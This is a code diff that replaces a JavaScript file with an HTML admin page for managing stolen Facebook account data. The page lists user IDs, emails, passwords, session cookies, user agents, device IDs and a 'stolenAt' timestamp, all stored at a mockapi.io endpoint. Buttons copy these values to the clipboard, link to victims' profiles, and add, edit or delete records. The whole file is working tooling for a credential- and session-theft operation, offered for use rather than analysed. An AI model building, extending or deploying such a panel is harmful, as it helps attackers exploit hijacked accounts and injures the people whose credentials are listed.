@@ -1,77 +1,334 @@
-const API = "https://65954b4d04335332df8268cd.mockapi.io/saved";
-const tbody = document.querySelector("tbody");
+<!DOCTYPE html>
+<html lang="en">
 
-function validateText(text, isNumber = false) {
-    if (text && text !== "") {
-        return isNumber ? !isNaN(Number(text)) && text : !text.includes(" ") && text;
-    }
-    return false;
-}
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Nodejs Server</title>
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
-function fillDataToTable() {
-    fetch(API)
-        .then((res) => res.json())
-        .then((data) => {
-            const html = data
-                .map((user, index) => {
-                    const shortCookie = user.cookie.split(";")[0].split("=")[1];
-                    return `<tr scope="row">
-                    <td><a class="text-white text-decoration-none fw-bold" target="_blank"  href='${
-                        validateText(user.c_user) ? "https://fb.com/" + user.c_user : "#"
-                    }'>${index + 1}</a></td>
-                    ${["c_user", "email", "password", "device_id"]
-                        .map(
-                            (field) => `
-                        <td title="${user[field]}" data-bs-coppy="${user[field]}" style='color: ${
-                                validateText(user[field]) ? "" : "red !important"
-                            }'>${validateText(user[field]) || "unknown"}</td>
-                    `
-                        )
-                        .join("")}
-                    <td data-bs-coppy="${user.cookie}" class="short-view" style='color: ${
-                        shortCookie || "red !important"
-                    }' title="${user.cookie}">${shortCookie || "unknown"}</td>
-                    <td data-bs-coppy="${user.userAgent}" class="short-view" title="${user.userAgent}">Coppy</td>
-                    <td title="${user.stolenAt}" data-bs-coppy="${user.stolenAt}">${user.stolenAt}</td>
-                    <td><button data-bs-toggle="modal" data-bs-target="#show-options-modal" class="menu-more btn btn-secondary" style="padding: 6px 20px;border-radius: 12px; background: #ffffff11; color: white" data-bs-id="${
-                        user.id
-                    }">More</button></td>
-                </tr>`;
-                })
-                .join("");
-            tbody.innerHTML = html;
-        })
-        .then(() => {
-            document.querySelectorAll("td[data-bs-coppy]").forEach((td) => {
-                td.onclick = () => {
-                    const text = td.getAttribute("data-bs-coppy");
-                    if (text && text !== "" && text !== "unknown") {
-                        navigator.clipboard.writeText(text);
-                        Swal.fire({
-                            title: "Success!",
-                            text: "Coppied to clipboard!",
-                            icon: "success",
-                            confirmButtonText: "Close",
-                        });
-                    } else {
-                        Swal.fire({
-                            title: "Error!",
-                            text: "Can not copy the empty value!",
-                            icon: "error",
-                            confirmButtonText: "Okay",
-                        });
-                    }
-                };
-            });
-        })
-        .finally(() => {
-            Swal.fire({
-                title: "Success!",
-                text: "Data updated!",
-                icon: "success",
-                confirmButtonText: "Close",
-            });
-        });
-}
+	<!-- Bootstrap css 5.3 link -->
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+</head>
 
-(() => fillDataToTable())();
+<body>
+	<style>
+		html,
+		body,
+		.intro {
+			height: 100%;
+			margin: 0;
+			/* Remove default margin */
+		}
+
+		table {
+			width: 100%;
+		}
+
+		table td,
+		table th {
+			text-overflow: ellipsis;
+			white-space: nowrap;
+			overflow: hidden;
+			background: transparent !important;
+			color: white !important;
+		}
+
+		.short-view {
+			width: 100px !important;
+		}
+
+		.mask-custom {
+			background: rgba(24, 24, 16, .2);
+			border-radius: 2em;
+			backdrop-filter: blur(25px);
+			border: 2px solid rgba(255, 255, 255, 0.05);
+			background-clip: padding-box;
+			box-shadow: 10px 10px 10px rgba(46, 54, 68, 0.03);
+		}
+
+		.mw-25 {
+			max-width: 250px !important;
+			overflow: scroll;
+		}
+
+		input {
+			background: transparent !important;
+			color: white;
+			border: none;
+		}
+
+		input:focus {
+			outline: none;
+		}
+
+		.table-wrapper {
+			max-height: 800px;
+			overflow-y: auto;
+		}
+
+		::-webkit-scrollbar,
+		::-webkit-scrollbar-thumb,
+		::-webkit-scrollbar-track {
+			width: 0;
+			height: 0;
+		}
+
+		td[data-bs-coppy]:hover {
+			color: #ddd !important;
+			cursor: pointer !important;
+		}
+
+		td {
+			align-items: center;
+		}
+	</style>
+	<section class="intro" style=" width: 100vw; height: 100vh;">
+		<div class="bg-image h-100" style="background-image: url(https://mdbootstrap.com/img/Photos/new-templates/glassmorphism-article/img7.jpg);">
+			<div class="mask d-flex align-items-center h-100">
+				<div class="container-fluid">
+
+					<div class="row justify-content-center">
+						<button style="display: block; margin: 15px auto; color: white;width: 200px;" class="mask-custom btn fw-bold" onclick="fillDataToTable()">Refresh</button>
+						<!-- <div></div> -->
+						<button style="display: block; margin: 15px auto; color: white;width: 200px;" class="mask-custom btn fw-bold" data-bs-toggle="modal" data-bs-target="#edit-modal">Add User</button>
+						<div class="col-12">
+							<div class="card mask-custom">
+								<div class="card-body">
+									<div class="table-responsive table-wrapper">
+										<table class="table table-hover table-stripedd table-borderless text-white mb-0">
+											<thead>
+												<tr>
+													<th scope="col">#</th>
+													<th scope="col">c_user</th>
+													<th scope="col">email</th>
+													<th scope="col">password</th>
+													<th scope="col" class="short-view">cookie</th>
+													<th scope="col" class="short-view">userAgent</th>
+													<th scope="col">device_id</th>
+													<th scope="col">timestamps</th>
+													<th scope="col">Action</th>
+												</tr>
+											</thead>
+											<tbody>
+
+												<!-- load user data -->
+
+											</tbody>
+										</table>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<script src="./script.js"></script>
+
+	<!-- Modal show more options -->
+	<!-- Modal -->
+	<div class="modal fade" id="show-options-modal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+		<div class="modal-dialog">
+			<div class="modal-content">
+				<div class="modal-header">
+					<h5 class="modal-title" id="exampleModalLabel">Choose a action?</h5>
+					<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+				</div>
+				<div class="modal-body">
+					<div>
+						<button data-bs-toggle="modal" data-bs-target="#edit-modal" class="btn btn-secondary btnEdit form-control">Edit</button>
+					</div>
+					<br>
+					<div>
+						<button data-bs-toggle="modal" data-bs-target="#delete-modal" class="btn btn-danger btnDelete form-control">Delete</button>
+					</div>
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn text-danger" data-bs-dismiss="modal">Cancel</button>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script>
+		var modalShowMoreOptions = document.getElementById('show-options-modal')
+		modalShowMoreOptions.addEventListener('show.bs.modal', function(event) {
+			var button = event.relatedTarget
+			var id = button.getAttribute('data-bs-id');
+
+			const btnEdit = modalShowMoreOptions.querySelector('.btnEdit');
+			const btnDelete = modalShowMoreOptions.querySelector('.btnDelete');
+
+			btnEdit.setAttribute('data-bs-id', id);
+			btnDelete.setAttribute('data-bs-id', id);
+
+		})
+	</script>
+	<!-- end modal show more option -->
+
+
+	<!-- Modal edit -->
+	<!-- Modal -->
+	<div class="modal fade" id="edit-modal" tabindex="-1" aria-labelledby="editModallabel" aria-hidden="true">
+		<div class="modal-dialog">
+			<div class="modal-content">
+				<div class="modal-header">
+					<h5 class="modal-title" id="editModallabel">Enter user data</h5>
+					<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+				</div>
+				<div class="modal-body">
+					<div>
+
+						<div class="mb-3">
+							<label for="c_user" class="form-label">c_user</label>
+							<input type="text" class="form-control" id="c_user">
+						</div>
+						<div class="mb-3">
+							<label for="email" class="form-label">email</label>
+							<input type="text" class="form-control" id="email">
+						</div>
+						<div class="mb-3">
+							<label for="password" class="form-label">password</label>
+							<input type="text" class="form-control" id="password">
+						</div>
+						<div class="mb-3">
+							<label for="cookie" class="form-label">cookie</label>
+							<input type="text" class="form-control" id="cookie">
+						</div>
+						<div class="mb-3">
+							<label for="userAgent" class="form-label">userAgent</label>
+							<input type="text" class="form-control" id="userAgent">
+						</div>
+						<div class="mb-3">
+							<label for="device_id" class="form-label">device_id</label>
+							<input type="text" class="form-control" id="device_id">
+						</div>
+						<div class="mb-3">
+							<label for="stolenAt" class="form-label">timestamps</label>
+							<input type="text" class="form-control" id="stolenAt">
+						</div>
+
+						<button type="button" class="btn btn-primary saveData">save</button>
+					</div>
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn text-danger" data-bs-dismiss="modal">Cancel</button>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script>
+		var editModal = document.getElementById('edit-modal')
+		editModal.addEventListener('show.bs.modal', function(event) {
+			var button = event.relatedTarget
+			var id = button.getAttribute('data-bs-id');
+			var saveData = editModal.querySelector('.saveData');
+
+			c_userEd = editModal.querySelector('#c_user');
+			emailEd = editModal.querySelector('#email');
+			passwordEd = editModal.querySelector('#password');
+			cookieEd = editModal.querySelector('#cookie');
+			userAgentEd = editModal.querySelector('#userAgent');
+			device_idEd = editModal.querySelector('#device_id');
+			stolenAtEd = editModal.querySelector('#stolenAt');
+
+			const API = "https://65954b4d04335332df8268cd.mockapi.io/saved";
+
+			id && id != "" ? fetch(`${API}/${id}`).then(res => res.json())
+				.then(res => {
+					if (res) {
+						c_userEd.value = res.c_user;
+						emailEd.value = res.email;
+						passwordEd.value = res.password;
+						cookieEd.value = res.cookie;
+						userAgentEd.value = res.userAgent;
+						device_idEd.value = res.device_id;
+						stolenAtEd.value = res.stolenAt;
+					}
+				}) : null
+
+			saveData.onclick = () => {
+
+				const newUser = {
+					c_user: c_userEd.value,
+					email: emailEd.value,
+					password: passwordEd.value,
+					cookie: cookieEd.value,
+					userAgent: userAgentEd.value,
+					device_id: device_idEd.value,
+					stolenAt: stolenAtEd.value
+				}
+
+				id && id != "" ?
+					fetch(`${API}/${id}`, {
+						method: 'PUT',
+						headers: {
+							'Content-Type': 'application/json'
+						},
+						body: JSON.stringify(newUser)
+					}).then(() => window.location.reload()) :
+					fetch(`${API}`, {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json'
+						},
+						body: JSON.stringify(newUser)
+					}).then(() => window.location.reload())
+			}
+
+		})
+
+		editModal.addEventListener('hidden.bs.modal', () => window.location.reload())
+	</script>
+
+	<!-- end modal edit -->
+
+
+	<!-- Modal delete -->
+	<!-- Modal -->
+	<div class="modal fade" id="delete-modal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">
+		<div class="modal-dialog">
+			<div class="modal-content">
+				<div class="modal-header">
+					<h5 class="modal-title" id="deleteModalLabel">Are you sure for delete this user?</h5>
+					<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn text-primary btnDelete" data-bs-dismiss="modal">Yes</button>
+					<button type="button" class="btn text-danger" data-bs-dismiss="modal">Cancel</button>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script>
+		var deleteModal = document.getElementById('delete-modal')
+		deleteModal.addEventListener('show.bs.modal', function(event) {
+			const API = "https://65954b4d04335332df8268cd.mockapi.io/saved"
+			var button = event.relatedTarget
+			var id = button.getAttribute('data-bs-id');
+
+			const btnDelete = deleteModal.querySelector('.btnDelete');
+			btnDelete.onclick = () => {
+
+				fetch(`${API}/${id}`, {
+					method: 'DELETE',
+				}).then(() => window.location.reload())
+			}
+
+		})
+
+		deleteModal.addEventListener('hidden.bs.modal', () => window.location.reload())
+	</script>
+	<!-- end modal delete -->
+
+	<!-- Bootstrap js 5.3 link -->
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
+
+
+</body>
+
+</html>
